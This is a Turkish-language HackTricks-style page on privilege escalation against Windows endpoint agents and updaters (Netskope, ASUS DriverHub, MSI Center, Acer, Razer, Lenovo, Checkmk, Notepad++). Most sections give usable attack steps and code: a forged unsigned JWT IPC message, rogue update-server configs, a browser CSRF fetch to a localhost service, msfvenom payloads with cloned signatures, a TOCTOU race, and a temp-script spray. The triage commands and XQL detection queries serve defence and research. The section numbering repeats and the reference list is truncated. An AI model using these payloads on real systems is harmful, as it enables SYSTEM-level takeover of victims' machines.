# Enterprise Auto-Updaters ve Privileged IPC'yi Kötüye Kullanma (örn. Netskope, ASUS ve MSI)

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, düşük sürtünmeli bir IPC yüzeyi ve ayrıcalıklı bir update akışı sunan enterprise endpoint agent'larında ve updater'larında bulunan bir Windows local privilege escalation zinciri sınıfını genelleştirir. Temsili bir örnek, düşük ayrıcalıklı bir kullanıcının enrollment işlemini attacker-controlled bir server'a yönlendirebildiği ve ardından SYSTEM service'in yüklediği malicious bir MSI gönderebildiği Netskope Client for Windows < R129 (CVE-2025-0309) örneğidir.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Benzer ürünlere karşı yeniden kullanabileceğiniz temel fikirler:
- Yeniden enrollment veya reconfiguration işlemini attacker server'a zorlamak için privileged service'in localhost IPC'sini kötüye kullanın.
- Vendor'ın update endpoint'lerini uygulayın, rogue Trusted Root CA gönderin ve updater'ı malicious, “signed” bir package'a yönlendirin.
- Zayıf signer kontrollerini (CN allow-list'leri), isteğe bağlı digest flag'lerini ve gevşek MSI property'lerini atlatın.
- IPC “encrypted” ise registry'de world-readable olarak saklanan machine identifier'lardan key/IV türetin.
- Service, çağıranları image path/process name ile kısıtlıyorsa allow-listed bir process'e inject edin veya bir process'i suspended olarak başlatıp minimal bir thread-context patch aracılığıyla DLL'inizi bootstrap edin.

---
## 1) localhost IPC üzerinden enrollment işlemini attacker server'a zorlama

Birçok agent, localhost TCP üzerinden JSON kullanarak SYSTEM service ile iletişim kuran bir user-mode UI process'iyle birlikte gelir.

Netskope'da gözlemlenenler:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit akışı:
1) Backend host'u (ör. AddonUrl) kontrol eden claim'lere sahip bir JWT enrollment token oluşturun. İmza gerekmemesi için alg=None kullanın.
2) Provisioning command'ını JWT'niz ve tenant name'iniz ile çağıran IPC mesajını gönderin:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Service enrollment/config için rogue server'ınıza istekler göndermeye başlar, örneğin:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Caller verification path/name-based ise isteği allow-list'e alınmış bir vendor binary'sinden başlatın (§4'e bakın).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) SYSTEM olarak code çalıştırmak için update channel'ı hijack etme

Client server'ınızla iletişim kurduktan sonra beklenen endpoint'leri implement edin ve onu bir attacker MSI'a yönlendirin. Tipik sequence:

1) /v2/config/org/clientconfig → Çok kısa bir updater interval'ı içeren JSON config döndürün, örneğin:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate döndürür. Service bunu Local Machine Trusted Root store'a yükler.
3) /v2/checkupdate → Kötü amaçlı bir MSI'ye ve sahte bir sürüme işaret eden metadata sağlar.

Gerçek dünyada görülen yaygın kontrolleri bypass etme:
- Signer CN allow-list: service yalnızca Subject CN değerinin “netSkope Inc” veya “Netskope, Inc.” olup olmadığını kontrol edebilir. Rogue CA'niz bu CN değerine sahip bir leaf sertifika oluşturabilir ve MSI'yi imzalayabilir.
- CERT_DIGEST property: CERT_DIGEST adlı zararsız bir MSI property ekleyin. Install sırasında enforcement uygulanmaz.
- Optional digest enforcement: config flag (ör. check_msi_digest=false), ek cryptographic validation işlemini devre dışı bırakır.

Sonuç: SYSTEM service, MSI'nizi şu konumdan yükleyerek
C:\ProgramData\Netskope\stAgent\data\*.msi
NT AUTHORITY\SYSTEM olarak arbitrary code çalıştırır.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass dersi: Bir vendor, update source'u cryptographically authenticate etmek yerine küçük bir “trusted” domain kümesine allow-list uygulayarak yanıt verirse, trafiği yönlendirmenize hâlâ izin veren vendor-owned redirector veya reverse proxy'leri arayın. Netskope örneğinde, kamuya açık follow-up research, R129 dönemi allow-list'inin attacker-controlled Azure App Service içeriğini proxy'leyen `rproxy.goskope.com` üzerinden hâlâ abuse edilebildiğini gösterdi. Hostname allow-list'lerini bir trust boundary değil, hız kesici olarak değerlendirin.<sup>[[14]](#references)</sup>

---
## 3) Encrypted IPC request'lerini forge etme (mevcut olduğunda)

R127'den itibaren Netskope, IPC JSON verisini Base64 gibi görünen bir encryptData field'i içine sardı. Reversing sonucunda, AES key/IV değerlerinin herhangi bir user tarafından okunabilen registry değerlerinden türetildiği görüldü:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers, encryption işlemini yeniden oluşturabilir ve standard user üzerinden geçerli encrypted command'ler gönderebilir.<sup>[[1]](#references)[[2]](#references)</sup> Genel ipucu: Bir agent aniden IPC'sini “encrypt” etmeye başlarsa, HKLM altında material olarak kullanılan device ID, product GUID ve install ID değerlerini arayın.

---
## 4) IPC caller allow-list'lerini bypass etme (path/name kontrolleri)

Bazı service'ler peer'i, TCP connection'ın PID değerini çözümleyip image path/name bilgisini Program Files altında bulunan allow-listed vendor binary'leriyle (ör. stagentui.exe, bwansvc.exe, epdlp.exe) karşılaştırarak authenticate etmeye çalışır.

İki pratik bypass:
- Allow-listed bir process'e (ör. nsdiag.exe) DLL injection uygulamak ve IPC'yi onun içinden proxy'lemek.
- Allow-listed bir binary'yi suspended olarak spawn etmek ve driver-enforced tamper rule'larını karşılamak için CreateRemoteThread kullanmadan proxy DLL'inizi bootstrap etmek (bkz. §5).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection uyumlu injection: suspended process + NtContinue patch

Ürünler genellikle protected process'lere ait handle'larda tehlikeli hakları kaldırmak için bir minifilter/OB callbacks driver'ı (ör. Stadrv) gönderir:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME haklarını kaldırır
- Thread: yalnızca THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE haklarına izin verir

Bu kısıtlamalara uyan güvenilir bir user-mode loader:
1) CREATE_SUSPENDED ile bir vendor binary'si için CreateProcess çağırın.
2) Hâlâ almanıza izin verilen handle'ları edinin: process üzerinde PROCESS_VM_WRITE | PROCESS_VM_OPERATION ve THREAD_GET_CONTEXT/THREAD_SET_CONTEXT haklarına sahip bir thread handle'ı (veya bilinen bir RIP üzerinde code patch'liyorsanız yalnızca THREAD_RESUME).
3) ntdll!NtContinue (veya erkenden ve kesin olarak map edilen başka bir thunk) üzerine, DLL path'iniz için LoadLibraryW çağıran ve ardından geri dönen tiny bir stub yazın.
4) Stub'ınızı process içinde tetiklemek ve DLL'inizi yüklemek için ResumeThread çağırın.

Zaten protected olan bir process üzerinde hiçbir zaman PROCESS_CREATE_THREAD veya PROCESS_SUSPEND_RESUME kullanmadığınızdan (process'i siz oluşturdunuz), driver policy karşılanır.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Pratik tooling
- NachoVPN (Netskope plugin), rogue CA oluşturma, malicious MSI signing ve gerekli endpoint'leri sunma işlemlerini otomatikleştirir: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope, arbitrary (isteğe bağlı olarak AES-encrypted) IPC message'ları oluşturan custom bir IPC client'ıdır ve allow-listed bir binary'den kaynaklanmak için suspended-process injection özelliğini içerir.<sup>[[4]](#references)</sup>

## 7) Bilinmeyen updater/IPC surface'leri için hızlı triage workflow'u

Yeni bir endpoint agent veya motherboard “helper” suite ile karşılaştığınızda, privesc için umut vadeden bir target'a bakıp bakmadığınızı anlamak için genellikle hızlı bir workflow yeterlidir:<sup>[[6]](#references)</sup>

1) Loopback listener'larını enumerate edin ve bunları vendor process'lerine geri eşleyin:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Aday named pipe'ları enumerate edin:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Plugin tabanlı IPC sunucuları tarafından kullanılan registry-backed routing data'yı toplayın:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Önce user-mode client'tan endpoint adlarını, JSON key'lerini ve command ID'lerini çıkarın. Packed Electron/.NET frontend'leri sıklıkla tüm schema'yı leak eder:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Sadece sonunda süreci başlatan kod yolunu değil, gerçek güven koşulunu araştırın:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Öncelik vermeye değer pattern'ler:
- `CryptQueryObject`/certificate parsing işlemlerinin `WinVerifyTrust` olmadan kullanılması genellikle “certificate mevcut” ifadesinin “certificate trusted” olarak kabul edildiği anlamına gelir; bu da certificate cloning veya diğer fake-signer tekniklerini mümkün kılar.
- `Origin`, `Referer`, download URL'leri, process name'leri veya signer CN'leri üzerinde substring/suffix kontrolleri authentication değildir. `contains(".vendor.com")` kullanımı, attacker-controlled lookalike domain'lerle genellikle exploit edilebilir.
- Low-privileged GUI “file trusted” kararını veriyor ve SYSTEM broker yalnızca bu sonucu tüketiyorsa, client-side DLL/JS'yi patch'lemek veya yeniden uygulamak boundary'yi tamamen bypass edebilir (Razer-style split validation).
- Broker bir payload'ı `%TEMP%`/`C:\Windows\Temp` konumuna kopyalıyor ve ardından bu path üzerinden validate ediyor veya schedule ediyorsa, hemen TOCTOU replacement window'larını ve daha zayıf kontroller sunan alternatif `ExecuteTask()` wrapper'larına sahip sibling plugin module'lerini test edin.<sup>[[6]](#references)</sup>

Named-pipe ağırlıklı target'larda PipeViewer, protocol'ü derinlemesine reverse etmeye başlamadan önce weak DACL'leri ve remotely reachable pipe'ları hızlıca tespit etmek için kullanışlıdır.<sup>[[11]](#references)</sup>

Target yalnızca PID, image path veya process name ile caller authentication yapıyorsa, bunu boundary yerine bir hız kesici olarak değerlendirin: legitimate client'a injecting yapmak veya allow-listed bir process'ten connection oluşturmak çoğu zaman server kontrollerini geçmek için yeterlidir. Named pipe'lar özelinde, [client impersonation ve pipe abuse hakkındaki bu sayfa](named-pipe-client-impersonation.md) primitive'i daha ayrıntılı ele alır.

---
## 8) Yalnızca vendor signature'larıyla authentication yapan modular add-in broker'lar (Lenovo Vantage pattern)

Avlanmaya değer daha yeni bir varyasyon **signed-client RPC broker**'dır: low-privileged Lenovo-signed desktop process'i bir SYSTEM service ile iletişim kurar ve service, JSON command'larını `%ProgramData%` altındaki XML-described add-in'lerden oluşan bir kümeye yönlendirir. **Herhangi bir accepted signed client içinde** code execution elde edildiğinde, her `runas="system"` contract'ı attack surface'inizin bir parçası olur.<sup>[[15]](#references)</sup>

Lenovo Vantage araştırmalarında gözlemlenen high-value primitive'ler:
- **Caller'ın vendor tarafından signed olduğu için trusted kabul edilmesi**: Araştırmacılar, Lenovo-signed bir EXE'yi writable bir directory'ye kopyalayıp bir DLL side-load (`profapi.dll`) koşulunu sağlayarak authenticated context'e ulaştı; böylece service'in zaten trusted kabul ettiği bir client içinde arbitrary code çalıştırdılar.
- **Manifest-driven attack surface discovery**: Add-in'ler `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` altında tanımlanır; çeşitli contract'lar `SYSTEM` olarak çalışır. Bu nedenle manifest'leri enumerate etmek, gerçek privileged verb'leri broker'ın kendisini reverse etmekten daha hızlı ortaya çıkarabilir.
- **Authenticated channel arkasındaki per-command bug'lar**: Trusted client içine girdikten sonra public research, update/install verb'lerinde path-traversal + race condition'lar, privileged settings database'lerinde raw-SQL abuse ve amaçlanan hive'ın dışına write yapılmasını sağlayan substring-based registry path kontrolleri buldu.

Bir target üzerindeki useful recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Pratik çıkarım: Bir helper suite önce **caller process**'i authenticate eden ve ancak bundan sonra düzinelerce plugin/add-in komutuna dispatch yapan bir broker sunuyorsa, front-door trust check'i bypass ettikten sonra durmayın. Manifest/contract tablosunu çıkarın ve her high-privilege verb'i bağımsız olarak fuzz edin; authenticated channel genellikle birkaç second-stage bug'ı gizler.

---
## 1) Privileged HTTP API'lere karşı Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 üzerinde çalışan ve browser çağrılarının https://driverhub.asus.com adresinden geldiğini bekleyen user-mode bir HTTP service (ADU.exe) gönderir. Origin filter, Origin header'ı ve `/asus/v1.0/*` tarafından sunulan download URL'leri üzerinde yalnızca `string_contains(".asus.com")` işlemini gerçekleştirir. Bu nedenle `https://driverhub.asus.com.attacker.tld` gibi attacker-controlled herhangi bir host check'i geçebilir ve JavaScript üzerinden state-changing request'ler gönderebilir.<sup>[[6]](#references)</sup> Ek bypass pattern'leri için [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) sayfasına bakın.

Pratik akış:
1) `.asus.com` içeren bir domain kaydedin ve burada malicious bir webpage barındırın.
2) `fetch` veya XHR kullanarak `http://127.0.0.1:53000` üzerindeki privileged bir endpoint'i (ör. `Reboot`, `UpdateApp`) çağırın.
3) Handler'ın beklediği JSON body'yi gönderin – packed frontend JS aşağıdaki schema'yı gösterir.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Aşağıda gösterilen PowerShell CLI bile, Origin header güvenilen değerle spoof edildiğinde başarılı olur:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Saldırgan sitesine yapılan herhangi bir browser ziyareti bu nedenle SYSTEM seviyesinde çalışan bir helper’ı yönlendiren 1 tıklamalı (veya `onload` üzerinden 0 tıklamalı) bir local CSRF işlemine dönüşür.

---
## 2) Güvensiz code-signing doğrulaması ve certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`, JSON body içinde tanımlanan rastgele executable dosyalarını indirir ve bunları `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` konumunda cache’ler. Download URL doğrulaması aynı substring mantığını yeniden kullandığından `http://updates.asus.com.attacker.tld:8000/payload.exe` kabul edilir. İndirme sonrasında ADU.exe, çalıştırmadan önce yalnızca PE dosyasının bir signature içerip içermediğini ve Subject string’inin ASUS ile eşleşip eşleşmediğini kontrol eder – `WinVerifyTrust` yoktur, chain validation yoktur.

Bu akışı weaponize etmek için:
1) Bir payload oluşturun (ör. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS signer bilgisini payload’a clone edin (ör. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `pwn.exe` dosyasını `.asus.com` benzeri bir lookalike domain üzerinde host edin ve yukarıdaki browser CSRF ile UpdateApp’i tetikleyin.

Hem Origin hem de URL filtreleri substring tabanlı olduğundan ve signer kontrolü yalnızca string’leri karşılaştırdığından DriverHub, saldırgan binary dosyasını elevated context altında indirip çalıştırır.<sup>[[6]](#references)</sup>

---
## 1) Updater copy/execute path’leri içinde TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center’ın SYSTEM service’i, her frame’in `4-byte ComponentID || 8-byte CommandID || ASCII arguments` biçiminde olduğu bir TCP protocol sunar. Core component (Component ID `0f 27 00 00`), `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` komutunu içerir. Handler’ı:
1) Sağlanan executable dosyasını `C:\Windows\Temp\MSI Center SDK.exe` konumuna kopyalar.
2) Signature’ı `CS_CommonAPI.EX_CA::Verify` üzerinden doğrular (certificate subject “MICRO-STAR INTERNATIONAL CO., LTD.” ile eşleşmeli ve `WinVerifyTrust` başarılı olmalıdır).
3) Temp dosyasını attacker-controlled arguments ile SYSTEM olarak çalıştıran bir scheduled task oluşturur.

Kopyalanan dosya verification ile `ExecuteTask()` arasında lock’lanmaz. Saldırgan:
- Signature check’in geçmesini ve task’ın queue’ya alınmasını garanti eden meşru MSI-signed bir binary’ye işaret eden Frame A’yı gönderebilir.
- Verification tamamlandıktan hemen sonra `MSI Center SDK.exe` dosyasının üzerine yazmak için malicious payload’a işaret eden tekrarlı Frame B mesajlarıyla race gerçekleştirebilir.

Scheduler çalıştığında, orijinal dosya doğrulanmış olmasına rağmen üzerine yazılan payload’ı SYSTEM altında çalıştırır. Güvenilir exploitation için, TOCTOU window kazanılana kadar CMD_AutoUpdateSDK komutunu spam’leyen iki goroutine/thread kullanılır.<sup>[[6]](#references)</sup>

---
## 2) Özel SYSTEM-level IPC ve impersonation’ı kötüye kullanma (MSI Center + Acer Control Centre)

### MSI Center TCP command set’leri
- `MSI.CentralServer.exe` tarafından yüklenen her plugin/DLL, `HKLM\SOFTWARE\MSI\MSI_CentralServer` altında kayıtlı bir Component ID alır. Bir frame’in ilk 4 byte’ı bu component’i seçer ve saldırganların komutları rastgele modüllere yönlendirmesine olanak tanır.
- Plugin’ler kendi task runner’larını tanımlayabilir. `Support\API_Support.dll`, `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` komutunu sunar ve doğrudan **signature validation** olmadan `API_Support.EX_Task::ExecuteTask()` çağrısı yapar – herhangi bir local user bunu `C:\Users\<user>\Desktop\payload.exe` konumuna işaret ederek deterministik şekilde SYSTEM execution elde etmek için kullanabilir.
- Loopback trafiğini Wireshark ile sniff etmek veya dnSpy’da .NET binary’lerini instrument etmek Component ↔ command mapping bilgisini hızlıca ortaya çıkarır; ardından custom Go/ Python client’lar frame’leri replay edebilir.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe’ları ve impersonation level’ları
- `ACCSvc.exe` (SYSTEM), `\\.\pipe\treadstone_service_LightMode` named pipe’ını sunar ve discretionary ACL’si uzak client’lara (ör. `\\TARGET\pipe\treadstone_service_LightMode`) izin verir. Bir file path ile command ID `7` gönderildiğinde service’in process-spawning routine’i çağrılır.
- Client library, argümanlarla birlikte bir magic terminator byte (113) serialize eder. Frida/`TsDotNetLib` ile dynamic instrumentation (instrumentation ipuçları için [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) bölümüne bakın), native handler’ın bu değeri `CreateProcessAsUser` çağrılmadan önce bir `SECURITY_IMPERSONATION_LEVEL` ve integrity SID değerine eşlediğini gösterir.
- 113 (`0x71`) değerinin 114 (`0x72`) ile değiştirilmesi, full SYSTEM token’ını koruyan ve high-integrity SID (`S-1-16-12288`) ayarlayan generic branch’e geçiş sağlar. Böylece oluşturulan binary hem local hem de cross-machine olarak unrestricted SYSTEM şeklinde çalışır.
- Bunu exposed installer flag’i (`Setup.exe -nocheck`) ile birleştirerek ACC’yi lab VM’lerinde vendor hardware olmadan da kurabilir ve pipe’ı kullanabilirsiniz.<sup>[[6]](#references)</sup>

Bu IPC bug’ları, localhost service’lerinin neden mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filtreleri, token filtering) uygulaması gerektiğini ve her modülün “run arbitrary binary” helper’ının aynı signer verification’larını paylaşması gerektiğini gösterir.

---
## 3) Weak user-mode validation ile desteklenen COM/IPC “elevator” helper’ları (Razer Synapse 4)

Razer Synapse 4 bu aileye başka bir kullanışlı pattern ekledi: düşük ayrıcalıklı bir user, `RzUtility.Elevator` üzerinden bir process başlatmak için COM helper’dan istekte bulunabilir; trust kararı ise privileged boundary içinde sağlam biçimde uygulanmak yerine bir user-mode DLL’e (`simple_service.dll`) devredilir.

Gözlemlenen exploitation path’i:
- `RzUtility.Elevator` COM object’ini instantiate edin.
- Elevated launch talep etmek için `LaunchProcessNoWait(<path>, "", 1)` çağrısı yapın.
- Public PoC’ta, `simple_service.dll` içindeki PE-signature gate, istek gönderilmeden önce patch’lenerek devre dışı bırakılır ve saldırganın seçtiği rastgele bir executable’ın başlatılmasına izin verilir.<sup>[[6]](#references)[[10]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Genel çıkarım: “helper” suite'lerini reverse ederken localhost TCP veya named pipes ile yetinmeyin. `Elevator`, `Launcher`, `Updater` veya `Utility` gibi adlara sahip COM sınıflarını kontrol edin; ardından privileged service'ın hedef binary'yi gerçekten doğrulayıp doğrulamadığını ya da yalnızca patch edilebilir bir user-mode client DLL tarafından hesaplanan sonuca güvenip güvenmediğini kontrol edin. Bu pattern Razer'ın ötesinde de genellenebilir: high-privilege broker'ın low-privilege taraftan gelen bir allow/deny kararını tükettiği her split design, olası bir privesc surface'idir.


---
## MSI repair sırasında öngörülebilir temp script execution (Checkmk Agent / CVE-2024-0670)

Bazı Windows agent'ları hâlâ privileged action'ları `C:\Windows\Temp` içine geçici bir `.cmd` yazarak ve bunu `SYSTEM` olarak execute ederek gerçekleştiriyor. Filename öngörülebilir olduğunda ve service mevcut dosyaları güvenli şekilde yeniden oluşturmuyorsa, low-privileged bir user gelecekte kullanılacak temp file'ı **read-only** olarak önceden oluşturabilir ve privileged process'in kendi script'i yerine attacker-controlled content execute etmesini sağlayabilir.

Vulnerable Checkmk Agent build'lerinde gözlemlenenler:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package'ın MSI **repair** işlemi<sup>[[8]](#references)[[9]](#references)</sup>

Pratik workflow:
1. Mevcut process ID'lerinden veya çalışan agent PID'sinden gerçekçi bir PID aralığı tahmin edin.
2. Kısa bir **ASCII** `.cmd` payload'ı yazın (`Set-Content -Encoding Ascii` veya `cmd.exe` redirection kullanın; batch files için UTF-16 PowerShell output kullanmaktan kaçının).
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd` dosyalarını aday aralık boyunca spray edin ve her dosyayı read-only olarak işaretleyin.
4. Privileged service'ın temp script'i yeniden oluşturmayı ve ardından execute etmeyi denemesi için cached MSI'ın repair işlemini trigger edin.<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
Ürün Windows Installer ile yüklenmişse, repair işlemini tetiklemeden önce `C:\Windows\Installer` altındaki rastgele görünümlü önbelleğe alınmış MSI dosyasını ürün adıyla eşleştirin:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operasyonel notlar:
- `qwinsta`, `msiexec /fa` etkileşimli olmayan bir WinRM shell'inden başarısız olduğunda ve mevcut bir masaüstü/bağlantısı kesilmiş session'ın repair işlemini doğru şekilde tetikleyip tetikleyemeyeceğini anlamanız gerektiğinde kullanışlıdır.<sup>[[7]](#references)</sup>
- Bu pattern, **world-writable konumlarda geçici script'ler stage eden ve daha sonra bunları SYSTEM olarak çalıştıran** diğer endpoint agent'ları ve updater'lara da genellenebilir. Predictable name'leri, exclusive create semantics eksikliğini ve on-demand tetiklenebilen repair/update flow'larını test edin.

---
## Weak updater validation üzerinden remote supply-chain hijacking (WinGUp / Notepad++)

Haziran 2025 ile Aralık 2025 arasında, Notepad++ update flow'unun arkasındaki hosting infrastructure'ı compromise eden saldırganlar, seçilen victim'lara seçici olarak malicious manifest'ler sundu. Eski WinGUp-tabanlı updater'lar update authenticity'yi tam olarak verify etmiyordu; bu nedenle hostile bir XML response, client'ları attacker-controlled URL'lere yönlendirebiliyordu. Client, indirilen installer üzerinde hem trusted certificate chain hem de geçerli bir PE signature zorunluluğu olmadan HTTPS content'i kabul ettiğinden victim'lar trojanized bir NSIS `update.exe` dosyasını indirip çalıştırdı.<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (local exploit gerekmez):
1. **Infrastructure interception**: CDN/hosting'i compromise edin ve update check'lerine malicious download URL'si gösteren attacker metadata'sı ile yanıt verin.
2. **Trojanized NSIS**: Installer bir payload indirip çalıştırır ve iki execution chain'i abuse eder:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` dosyasını bundle edin ve search path'ine malicious bir `log.dll` bırakın. Signed binary çalıştığında Windows `log.dll` dosyasını sideload eder; bu DLL, Chrysalis backdoor'unu decrypt edip reflectively load eder (static detection'ı zorlaştırmak için Warbird-protected + API hashing).
- **Scripted shellcode injection**: NSIS, shellcode inject etmek ve Cobalt Strike Beacon stage etmek için Win32 API'lerini (ör. `EnumWindowStationsW`) kullanan derlenmiş bir Lua script'i çalıştırır.<sup>[[12]](#references)</sup>

Herhangi bir auto-updater için hardening/detection çıkarımları:
- İndirilen installer için **certificate + signature verification** uygulayın (vendor signer'ı pin'leyin, eşleşmeyen CN/chain'i reddedin) ve update manifest'inin kendisini sign edin (ör. XMLDSig). Manifest-controlled redirect'leri validate edilmeden block edin.
- **BYO signed binary sideloading** işlemini post-download detection pivot olarak ele alın: signed bir vendor EXE canonical install path'i dışındaki bir DLL name'i yüklediğinde (ör. Bitdefender'ın Temp/Downloads konumundan `log.dll` yüklemesi) ve bir updater temp konumundan non-vendor signature'lı installer'ları drop/execute ettiğinde alert üretin.
- Bu chain'de gözlemlenen malware-specific artifact'ları izleyin (generic pivot'lar olarak kullanışlıdır): `Global\Jdhfv_1.0.1` mutex'i, `%TEMP%` konumuna yapılan anomalous `gup.exe` write işlemleri ve Lua-driven shellcode injection stage'leri.
- Notepad++ v8.8.9 ve sonraki sürümlerde WinGUp'ı güçlendirerek yanıt verdi: döndürülen XML artık signed (XMLDSig) ve daha yeni build'ler transport'a tek başına güvenmek yerine indirilen installer için certificate + signature verification uyguluyor.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> bir Notepad++ olmayan installer'ı başlatıyor</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Bu kalıplar, imzasız manifest'leri kabul eden veya installer imzalayanlarını sabitlemeyen tüm updater'lar için geçerlidir—network hijacking + malicious installer + BYO-signed sideloading, “trusted” updates görünümü altında remote code execution elde edilmesini sağlar.

---
## Referanslar
- [1] [Advisory – Netskope Client for Windows – Rogue Server üzerinden Local Privilege Escalation (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
